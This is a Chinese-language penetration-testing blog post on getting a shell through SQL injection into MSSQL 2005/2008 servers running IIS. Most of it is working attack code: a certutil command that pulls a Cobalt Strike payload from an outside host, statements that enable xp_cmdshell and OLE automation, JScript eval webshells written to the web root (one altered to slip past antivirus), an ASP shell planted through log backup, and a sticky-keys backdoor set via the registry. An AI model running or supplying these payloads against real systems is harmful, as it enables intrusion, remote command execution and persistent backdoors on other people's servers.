> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzIwMzIyMjYzNA==&mid=2247489361&idx=1&sn=8ea1a12833c9a4d1ca13718fef6e7f6c&chksm=96d3ec54a1a4654292dd5f6c259ebf88707e09395dc387232238b90b8caeb2114640ad84c38e&mpshare=1&scene=1&srcid=0103u21xZQcMcoXGjAbgUvUC&sharer_sharetime=1609646741747&sharer_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=aa37eea3a2616ab366b99341e48a31e923213e2c6a42950da1155dfa1de4e2da5bd82b4865cff44eaf90570a7222b2962c5981e53114aca074d5a01d97262fa2df24f94e7daa0241821465d354480f17c03528f991d14af020a5bb39894d86b4fc2b31e154f4a70b05b957a7bb8da52b12054ed4bbb37db24bdbd48c83629ee6&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=63010029&lang=zh_CN&exportkey=ARTLDP8AH9GXtP8i%2Fj%2FIKOU%3D&pass_ticket=yy556pu%2Bp4W4mbvK7Q3O6PIbolc7ebdCh%2F3poyqaL0RGTca9FUoYwlT9SUXPGlGT&wx_header=0&fontgear=2)

0x01 环境准备
---------

```
windows2008+MSSQL2008+iis7windows2003+MSSQL2005+iis6
```

08 和 05 的 mssql 还是有些区别的

05 以下系统权限为 system

08 以上系统权限就不是 system 了，看到好几种，比较多的是 network service

0x02 通过命令下载文件得到 shell
---------------------

certutil 这个用的比较多，别的也没有试过，这篇文章比较详细

https://payloads.online/archivers/2017-11-08/1

环境用的是 08

首先通过 sqlmap --os-shell 得到执行命令的权限

打开 python 一句话服务器，在 CS 上面生成木马放到根目录

```
certutil.exe -urlcache -split -f http://192.168.163.128:8080/artifact.exe
```

如果提示拒绝访问，可以在找一个能创建文件夹的目录，创建完之后下载到文件夹里

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCxqU2edRfHBmyjuS1w5fpibepqOkOQThTf1ZQeEia9Xia3ctODT04DhebQ/640?wx_fmt=png)

这里会超时，然后 sqlmap 会重复执行命令，CS 会上线好几次，如果不需要的话发现上线直接退出 sqlmap 即可

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCiboia53YubO1w6Gufp2Sia2y72uvMjkevg8okREtxaQjVwMfRtAI8ibib8A/640?wx_fmt=png)

这里用户本来应该是 network service，但是安装的时候设置了一下就变成 administrator，如果为 network service 可以使用 juicypotato 提权

0x03 绝对路径写 webshell
-------------------

写 webshell 不难，但是找到绝对路径挺难的，总结了一下找绝对路径的方法

*   报错信息
    
*   配置文件
    
*   cmd 命令搜索文件
    
*   找旁站路径
    
*   xp_dirtree
    
*   xp_subdirs
    
*   修改 404 页面
    
*   爆破路径
    

通过堆叠注入开启 xp_cmdshell

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
```

### 报错信息

这个需要管理员配置过 web.config，如果没配置过是看不到的（配置过也不一定看的到..）

```
<configuration>
    <system.web>
        <customErrors mode="Off"/>
    </system.web>
</configuration>


```

这样应该是可以看到路径的

### ![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCtgjNUlocuIx7XLMRSwWGkuBqW9HrFWhVHQXTjkNHDXIEjxZx58sxnQ/640?wx_fmt=png)

### 配置文件

通过 type 读取配置文件

**适用于 2005 或者高权限启动的 2008**

```
C:\Windows\system32\inetsrv\metabase.xml        #iis6
C:\Windows\System32\inetsrv\config\applicationHost.config       #iis7

```

这个没啥问题，最好是有联合查询注入的时候使用，不然是真的慢

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCVkj7licVbDue9pjLdgONr1Q6NiarVcYicsDbY13qIzbyfKTXORw3x7IMQ/640?wx_fmt=png)

这是 08 的配置文件

### cmd 命令搜索文件

```
dir/s/b c:\index.aspx

/s      #列出所有子目录下的文件和文件夹

/b      #只列出路径和文件名，别的属性全部不显示

dir本身有检索功能，直接输入 dir index.aspx，会列出当前文件夹下文件名为index.aspx的文件属性，通过上面的命令可以检索磁盘下面的文件，并且不列出文件属性，减少数据量。

尽量找一些不是很常见的文件名，如果同服务器有别的网站或者有备份文件，用常见的名字会列出很多

```

结果 hw 的时候坑了一下，碰到的一个服务器没有 E 盘却有 F 盘，然后列到没 E 盘就没往下试了，完美的错过了网站根目录，而且在 D 盘里面还有个很像网站根目录的地方，就使劲往里写，但是一点反应都没有，还好后来有个师傅在 F 盘里面找到了根目录最后拿到了 shell

其实当时 sqlmap 在列数据库路径的时候也显示数据库在 F 盘里，不过后来一直想着总不会真的在 F 盘里吧，外加是时间盲注真的很慢就没有去试，结果还真的踩坑了，看来以后还是需要细心

后来问了师傅是怎么找到根目录的，师傅说用了 for 循环，但是没有给出具体命令，然后我去网上查了一下，自己写了一条命令

```
for %i in (c d e f g h i j k l m n o p q r s t u v w x v z) do @(dir/s/b %i:\sql.aspx)

```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCGR03cqTegbbNnjKdl3x1xWmL30YMVEvxAerugvPIOMeVlBRcJ49xPA/640?wx_fmt=png)

这个命令看起来有点蠢（其实真的蠢，应该还有效率高的但是想不出来了..）  

还有用这个命令最好在 linux 上面的 sqlmap 的，linux 上面发现绝对路径可以直接 Ctrl+c 停止，会返回 os-shell，如果 windows 就会直接退出 sqlmap

os-shell 最好使用 q 退出，让 sqlmap 按照完整的过程退出 os-shell，如果直接退出可能会出点问题，比如第二次 os-shell 就上不去了

sqlmap 超时时间需要设置长一点，毕竟要跑全盘，--timeout=100

### 找旁站路径

看看旁站有没有地方可以爆出绝对路径，写到旁站里面

之前碰到过一个 mysql 的网站，可以写文件但是注入的那个站目录不可写，通过 sqlmap 读出 httpd.conf，在里面找到了旁站的路径，然后写了 webshell

### xp_dirtree

xp_dirtree 有三个参数，

1.  要列的目录
    
2.  是否要列出子目录下的所有文件和文件夹，默认为 0，如果不需要设置为 1
    
3.  是否需要列出文件，默认为不列，如果需要列文件设置为 1
    

```
xp_dirtree 'c:\', 1, 1      #列出当前目录下所有的文件和文件夹

```

通过堆叠注入建表，将输出插入表里，通过注入将表列出来

```
http://192.168.163.133/sql.aspx?id=1;create table dir(subdirectory varchar(255),depth int, filee int);insert into dir(subdirectory,depth,filee) exec xp_dirtree 'c:\',1,1

```

因为 xp_dirtree 输出是三个字段的所以要创建一个三个字段的表 ，字段名可以随便取

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCGxQJFz4X3eqsA2o9mfSicuUkpicluPYaprUftiaDkTK8GAiaxkn56tkHpw/640?wx_fmt=png)

通过 sqlmap 列出 dir 表就可以看到目录了

sqlmap 有缓存，可以通过 --fresh-queries 重新列数据表，--flush-session 这个直接清掉缓存重新跑

### xp_subdirs

```
xp_subdirs 'c:\'

```

这个方法和上面的一样，缺点是不能列出文件

### 修改 404 页面

**适用于 2005 或者高权限启动的 2008**

上面有两个配置文件路径一个是 iis6 一个是 iis7

iis 的报错页面一般都在

C:\inetpub\custerr\zh-CN

最后语言这个文件夹可能会变，之前看到湾湾的是 zh-TW，如果是外语的话可能也会变成相应的

```
exec sp_configure 'show advanced options', 1;RECONFIGURE
exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'C:\Windows\System32\inetsrv\config\applicationHost.config' ,'C:\inetpub\custerr\zh-CN\404.htm';

```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCNKD5VzKMAARIr2GnG0Wd5csvvFg54gDz4wEzOWhaYjc8DqlxLicJSag/640?wx_fmt=png)

如果是 05 的数据库要修改配置文件路径

C:\WINDOWS\Help\iisHelp\common\404b.htm #iis6 404 页面位置  
C:\Windows\system32\inetsrv\metabase.xml #iis6 配置文件

### 爆破路径

爆破我觉得实在有点不现实就不写了，毕竟路径只要不是默认的基本就很难猜到了

一般来说 iis 的默认根目录为 C:\inetpub\wwwroot\

得到绝对路径之后就可以写入 webshell 了

```
echo ^<%@ Page Language="Jscript"%^>^<%Response.Write(eval(Request.Item["z"],"unsafe"));%^> > C:\inetpub\wwwroot\shell.aspx

```

<> 需要转义

0x04 sp_oacreate 写入 webshell
----------------------------

**需要知道绝对路径**

如果 xp_cmdshell 被删除无法恢复，或者被过滤，可以使用 xp_dirtree 或 xp_subdirs 列出目录，通过 sp_oacreate 写入 webshell

通过堆叠注入开启 sp_oacreate

```
exec sp_configure 'show advanced options', 1;RECONFIGURE
exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE

```

这个之前没了解，看了文章发现还挺有趣的，利用的方法也很多

先写最简单的执行命令吧

```
declare @o int;
exec sp_oacreate 'wscript.shell',@o out;
exec sp_oamethod @o,'run',null,'cmd /c mkdir c:\temp';
exec sp_oamethod @o,'run',null,'cmd /c "net user" > c:\temp\user.txt';
create table cmd_output (output text);
BULK INSERT cmd_output FROM 'c:\temp\user.txt' WITH (FIELDTERMINATOR='n',ROWTERMINATOR = 'nn')      -- 括号里面两个参数是行和列的分隔符，随便写就行
select * from cmd_output

```

列出 cmd_output 得到命令结果

如果这个命令执行成功，会返回 0

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCR92iaq9RILnNGEyCH0GCmrgIsgXyicViaQtiawmia4c4zGHw7XicKHmdETGg/640?wx_fmt=png)

其实就是执行了一个 vbs

```
Set objShell = CreateObject("wscript.shell")
objShell.run "cmd /c mkdir c:\temp"
objShell.run "cmd /c net user > c:\temp\user.txt"

```

还有一种用 Shell.Application 的方法，这个直接执行命令没有复现成功，但是通过 vbs 脚本执行命令是成功的

可以使用 scripting.filesystemobject 写入文件后执行

```
declare @f int,@g int
exec sp_oacreate 'Scripting.FileSystemObject',@f output
EXEC SP_OAMETHOD @f,'CreateTextFile',@f OUTPUT,'c:\inetpub\wwwroot\cmd.vbs',1
EXEC sp_oamethod  @f,'WriteLine',null,'Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "cmd", "cmd /c whoami>c:\whoami.txt", "", "runas",1'
declare @o int

exec sp_oacreate 'Shell.Application', @o out
exec sp_oamethod @o, 'ShellExecute',null, 'cmd.exe','cmd /c net user >c:\test.txt','c:\windows\system32','','1'; --支持2005，不支持2008

exec sp_oamethod @o,'ShellExecute',null,'c:\inetpub\wwwroot\cmd.vbs', '', 'c:\', '', 0 --成功

```

然后和上面一样写入表里就可以了

这里的 vbs

```
Set write = CreateObject("Scripting.FileSystemObject")
write.CreateTextFile("c:\inetpub\wwwroot\cmd.vbs).WriteLine("Set objShell = CreateObject(""Shell.Application"")"+CHR(13)+"objShell.ShellExecute ""cmd"", ""cmd /c whoami>c:\whoami.txt"", """", ""runas"", 1")
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "c:\inetpub\wwwroot\cmd.vbs", "", "c:\", "", 0

```

这里顺便写一下，xp_cmdshell 会出现

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCM2rhRvYiccp5Xb0ZEoIicUFs3ZVJrqHUSYibJGVAa8GjUK2bKsWjEt3sw/640?wx_fmt=png)

在执行 xp_cmdshell 的过程中出错。调用'CreateProcess' 失败，错误代码: '5'。

网上查了之后几种说法

1.  没有 cmd
    
2.  没有权限执行 cmd
    
3.  服务器上有杀毒软件
    

没有 cmd 想想也不太可能，没 cmd 系统估计都要出问题，但是还是尝试删除 cmd，03 上面删了会自己恢复，08 删不掉

没有权限执行，这个也尝试了一下，但是没权限配置权限，后来也没继续看了

安装 360 后发现 360 会拦截

经过测试只要 mssql 带起可以执行命令的文件都会拦截，sp_oacreate 也是用不了的，powershell 也不行

暂时没找到什么方法，基本所有执行命令的方法都会被拦截，Agent Job 也不行，因为也要启动 powershell，而且这个还需要启动 mssql 代理，所以这种方法就不复现了

如果服务器上存在 web 服务，可以通过上面那种写 vbs 的方法将 webshell 写入网站根目录，

```
declare @f int,@g int
exec sp_oacreate 'Scripting.FileSystemObject',@f output
EXEC SP_OAMETHOD @f,'CreateTextFile',@f OUTPUT,'c:\inetpub\wwwroot\shell.aspx',1
EXEC sp_oamethod  @f,'WriteLine',null,'<%@ Page Language="Jscript"%><%var a = "un";var b = "safe";Response.Write(eval(Request.Item["z"],a+b));%>'

```

一句话需要免杀，网上找了个方法处理一下就过了

0x05 备份 getshell
----------------

**需要知道绝对路径**

testdb 是当前数据库

网上查到两种方法，一种是差异备份一种是 log 备份

差异备份 2005 和 2008 均没有复现成功

05 会一直报少一个 %> 标记，08 会多一个 <% 然后报错，如果有解决的大佬希望可以告知一下，提前感谢

log 备份

```
alter database testdb set RECOVERY FULL 
backup database testdb to disk = 'c:\bak.bak'
create table cmd (a image) 
backup log testdb to disk = 'c:\aaa.bak' with init 
insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) 
backup log testdb to disk = 'C:\inetpub\wwwroot\shell.asp'

```

两个数据库都可以成功，备份文件小，不容易出现脏数据

0x06 劫持粘滞键
----------

**适用于 2005，服务器开放 3389**

sp_oacreate 复制文件

```
exec sp_configure 'show advanced options', 1;RECONFIGURE
exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE
declare @o int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'copyfile',null,'c:\windows\system32\cmd.exe' ,'c:\windows\system32\sethc.exe';

```

xp_regwrite 修改注册表

```
exec xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Image File Execution
Options\sethc.EXE','Debugger','REG_SZ','c:\windows\system32\cmd.exe';

```

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCtqBHgseRqsAq8Ov5O65oZ9ibN1qBv6QV6jD5ARCjHPY28IzsHmqLCrg/640?wx_fmt=png)
----------------------------------------------------------------------------------------------------------------------------------------------

0x07 复现过程中的一些问题
---------------

之前看到过一篇文章是不需要堆叠注入执行命令，而且还要使用 if，然后在测试的时候发现，只要在正确的语句后面接上语句都是可以执行的，不需要;，在 web 上面也是可以的

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOCZFKmX63oZceqKVFFtRYbia0ojD2Lj1niaI1uibqL7ibm0D2cuaaxTguyAQ/640?wx_fmt=png)

成功添加数据库

![](https://mmbiz.qpic.cn/mmbiz_png/GzdTGmQpRic18icGiboSLymNfrmsgqOPrOC9dpjE6dryaLqXCDA6f92R91k6fAsiaibB8whuiaFQt62zibxB5dk2G3YFA/640?wx_fmt=png)

那这样是不是就不需要堆叠注入了

想知道一下原理但是问了几个地方都没有得到想要的答案，有位大佬说是 mssql 解释器的问题，但是具体也不清楚

如果有大佬知道的还希望大佬可以告诉我，感谢

作者：Macchiato，文章来源：先知社区

**关注公众号: HACK 之道**  

![](https://mmbiz.qpic.cn/mmbiz_jpg/GzdTGmQpRic3qL1R1NCVbY1ElanNngBlMTUKUibAUoQNQuufs7QibuMXoBHX5ibneNiasMzdthUAficktvRzexoRTXuw/640?wx_fmt=jpeg)

如文章对你有帮助，请支持点下 “赞”“在看”